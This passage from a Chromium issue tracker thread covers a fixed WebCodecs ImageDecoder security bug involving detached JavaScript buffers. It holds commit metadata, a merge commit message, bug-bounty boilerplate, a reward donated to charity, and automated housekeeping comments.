Change-Id: Iefe5f8adf619cd6afdfedcb08a13c2996bfe0d32
Fixed: 1146761
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2527542
Commit-Queue: Dale Curtis <dalecurtis@chromium.org>
Auto-Submit: Dale Curtis <dalecurtis@chromium.org>
Reviewed-by: Dan Sanders <sandersd@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#825615}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2537781
Reviewed-by: Dale Curtis <dalecurtis@chromium.org>
Cr-Commit-Position: refs/branch-heads/4240@{#1453}
Cr-Branched-From: f297677702651916bbf65e59c0d4bbd4ce57d1ee-refs/heads/master@{#800218}

[modify] https://crrev.com/381c4b56794f0d26b50a9641cf3740c7b9a1a466/third_party/blink/renderer/modules/webcodecs/image_decoder_external.cc
[modify] https://crrev.com/381c4b56794f0d26b50a9641cf3740c7b9a1a466/third_party/blink/renderer/modules/webcodecs/image_decoder_external.h
[modify] https://crrev.com/381c4b56794f0d26b50a9641cf3740c7b9a1a466/third_party/blink/renderer/modules/webcodecs/image_decoder_external_test.cc


### ad...@google.com (2020-11-16)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-16)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-11-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/5a6424fe894c0d1efe350722f2014b926d826162

commit 5a6424fe894c0d1efe350722f2014b926d826162
Author: Dale Curtis <dalecurtis@chromium.org>
Date: Wed Nov 18 14:30:42 2020

Merge M86: "Ensure that buffers used by ImageDecoder haven't been neutered."

Since JavaScript may detach the underlying buffers, we need to check
to ensure they're still valid before using them for decoding.

TBR=sandersd

(cherry picked from commit fa93fba6a28d384b0a0cddd63e85eb10cb97bb53)

(cherry picked from commit 381c4b56794f0d26b50a9641cf3740c7b9a1a466)

Test: Updated unittests. Manual test case breaks.
Change-Id: Iefe5f8adf619cd6afdfedcb08a13c2996bfe0d32
Fixed: 1146761
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2527542
Commit-Queue: Dale Curtis <dalecurtis@chromium.org>
Auto-Submit: Dale Curtis <dalecurtis@chromium.org>
Reviewed-by: Dan Sanders <sandersd@chromium.org>
Cr-Original-Original-Commit-Position: refs/heads/master@{#825615}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2537781
Reviewed-by: Dale Curtis <dalecurtis@chromium.org>
Cr-Original-Commit-Position: refs/branch-heads/4240@{#1453}
Cr-Original-Branched-From: f297677702651916bbf65e59c0d4bbd4ce57d1ee-refs/heads/master@{#800218}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2544507
Reviewed-by: Achuith Bhandarkar <achuith@chromium.org>
Reviewed-by: Victor-Gabriel Savu <vsavu@google.com>
Commit-Queue: Jana Grill <janagrill@chromium.org>
Cr-Commit-Position: refs/branch-heads/4240_112@{#33}
Cr-Branched-From: 427c00d3874b6abcf4c4c2719768835fc3ef26d6-refs/branch-heads/4240@{#1291}
Cr-Branched-From: f297677702651916bbf65e59c0d4bbd4ce57d1ee-refs/heads/master@{#800218}

[modify] https://crrev.com/5a6424fe894c0d1efe350722f2014b926d826162/third_party/blink/renderer/modules/webcodecs/image_decoder_external.cc
[modify] https://crrev.com/5a6424fe894c0d1efe350722f2014b926d826162/third_party/blink/renderer/modules/webcodecs/image_decoder_external.h
[modify] https://crrev.com/5a6424fe894c0d1efe350722f2014b926d826162/third_party/blink/renderer/modules/webcodecs/image_decoder_external_test.cc


### ad...@google.com (2020-11-18)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-11-18)

Congratulations, the VRP panel has awarded $7,500 for this bug.

### ad...@google.com (2020-11-18)

btiszka@ please confirm you would like to donate this reward to charity per https://crbug.com/chromium/1146761#c3. Thanks!

### bt...@gmail.com (2020-11-18)

Confirmed. Please double up to the @eff

### da...@davidmanouchehri.com (2020-11-18)

🎉

### ad...@google.com (2020-11-19)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-21)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-30)

[Empty comment from Monorail migration]

### ad...@google.com (2020-12-07)

Hmm, sheriffbot bug. I shall attend to it.

### ad...@google.com (2020-12-14)

Sheriffbot bug fixed. Hopefully the zombie label won't return.

### ad...@google.com (2021-01-07)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### [Deleted User] (2021-02-16)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2021-02-16)

This issue was migrated from crbug.com/chromium/1146761?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053811)*
